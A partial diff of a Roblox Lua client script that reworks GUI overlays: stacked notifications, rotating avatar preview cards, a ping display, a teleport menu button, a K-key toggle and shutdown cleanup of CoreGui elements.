+
+    updateNotificationStack(false)
+
     local tweenIn = TweenService:Create(
         frame,
         TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-        {Position = UDim2.new(0, 20, 0, 20)}
+        {Position = UDim2.new(1, -20, 0, 20 + ((#activeNotifications - 1) * (92 + NOTIFICATION_SPACING)))}
     )
 
     local tweenOut = TweenService:Create(
         frame,
         TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
-        {Position = UDim2.new(0, -340, 0, 20)}
+        {Position = UDim2.new(1, 370, 0, frame.Position.Y.Offset)}
     )
 
     tweenIn:Play()
 
     task.spawn(function()
         task.wait(4)
+
         if not frame or not frame.Parent then
-            safeDestroy(gui)
             return
         end
 
         tweenOut:Play()
         tweenOut.Completed:Wait()
-        safeDestroy(gui)
+
+        for i, notif in ipairs(activeNotifications) do
+            if notif == frame then
+                table.remove(activeNotifications, i)
+                break
+            end
+        end
+
+        safeDestroy(frame)
+        updateNotificationStack(true)
+
+        if #activeNotifications == 0 and gui then
+            safeDestroy(gui)
+        end
     end)
 end
 
@@ -1041,6 +1467,92 @@ local function initialBaconScan()
         end)
     end
 end
+
+--==============================================================
+-- 11) CONNECTIONS / HEARTBEAT / CLEANUP
+--==============================================================
+
+trackConnection(RunService.Heartbeat:Connect(function(deltaTime)
+    if shuttingDown then
+        return
+    end
+
+    local viewportSize = getScreenSize()
+    if viewportSize ~= lastViewportSize then
+        lastViewportSize = viewportSize
+        layoutDirty = true
+    end
+
+    pingUpdateAccumulator = pingUpdateAccumulator + deltaTime
+    if pingUpdateAccumulator >= 0.35 then
+        pingUpdateAccumulator = 0
+        updatePingDisplay()
+    end
+
+    if layoutDirty then
+        layoutDirty = false
+        updateAllPreviews()
+    end
+
+    if not previewsVisible then
+        return
+    end
+
+    local rotationAngle = math.rad(ROTATION_SPEED_DEG * deltaTime)
+
+    for userId, data in pairs(activePreviews) do
+        local model = data.Model
+        if model and model.Parent then
+            model:PivotTo(model:GetPivot() * CFrame.Angles(0, rotationAngle, 0))
+        else
+            local player = Players:GetPlayerByUserId(userId)
+            if not player then
+                cleanupPreview(userId)
+            end
+        end
+    end
+end))
+
+trackConnection(UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then
+        return
+    end
+
+    if input.KeyCode == Enum.KeyCode.K and not toggleBusy then
+        toggleBusy = true
+        previewsVisible = not previewsVisible
+
+        setPreviewsVisibleAnimated(previewsVisible)
+
+        task.delay(TOGGLE_FADE_TIME + 0.03, function()
+            toggleBusy = false
+        end)
+
+        if previewsVisible then
+            print("Previews SHOWN")
+        else
+            print("Previews HIDDEN")
+        end
+    end
+end))
+
+trackConnection(Players.PlayerAdded:Connect(function(player)
+    task.delay(1, function()
+        if shuttingDown then
+            return
+        end
+        layoutDirty = true
+    end)
+end))
+
+trackConnection(Players.PlayerRemoving:Connect(function(player)
+    task.delay(0.2, function()
+        cleanupPreview(player.UserId)
+        if not shuttingDown then
+            layoutDirty = true
+        end
+    end)
+end))
 
 trackConnection(Players.PlayerAdded:Connect(function(player)
     task.delay(2, function()
@@ -1071,25 +1583,41 @@ function System.Shutdown()
         cleanupPreview(userId)
     end
 
-    if pingGui then
-        safeDestroy(pingGui)
-        pingGui = nil
+    if topBarGui then
+        safeDestroy(topBarGui)
+        topBarGui = nil
+        pingHolder = nil
         pingLabel = nil
+        pingFadeCover = nil
+        teleportMenuButton = nil
+        teleportButtonFadeCover = nil
+        teleportMenu = nil
+        teleportMenuFadeCover = nil
+        teleportWarningLabel = nil
+        mobileConfirmFrame = nil
+        mobileConfirmFadeCover = nil
     end
 
     for _, obj in ipairs(CoreGui:GetChildren()) do
         if obj:IsA("ScreenGui") then
-            if string.find(obj.Name, "^AvatarPreview_") or string.find(obj.Name, "^BaconWarning_") or obj.Name == "CustomNotification" then
+            if string.find(obj.Name, "^AvatarPreview_")
+                or obj.Name == "CustomNotification"
+                or obj.Name == "CustomNotificationContainer"
+                or obj.Name == "AvatarPreviewTopBar" then
                 safeDestroy(obj)
             end
         end
     end
 end
 
-createPingDisplay()
+--==============================================================
+-- STARTUP
+--==============================================================
+
+createTopBarAndMenu()
 layoutDirty = true
 updateAllPreviews()
 initialBaconScan()
 
-print("✨ Styled Avatar Previews + Auto Layout + Better Camera Fit + Bigger Text + Custom Bacon Notification + Account Age + Ping Display LOADED!")
-print("💡 Press K to toggle previews (hide / show)")
+print("✨ Styled Avatar Previews + Auto Layout + Better Camera Fit + Teleport Menu + Mobile Confirm Popup + Bigger Stats Text + Account Age + Ping + Bacon Detector LOADED!")
+print("💡 Press K to toggle everything (cards + ping + teleport button + teleport menu + popup)")
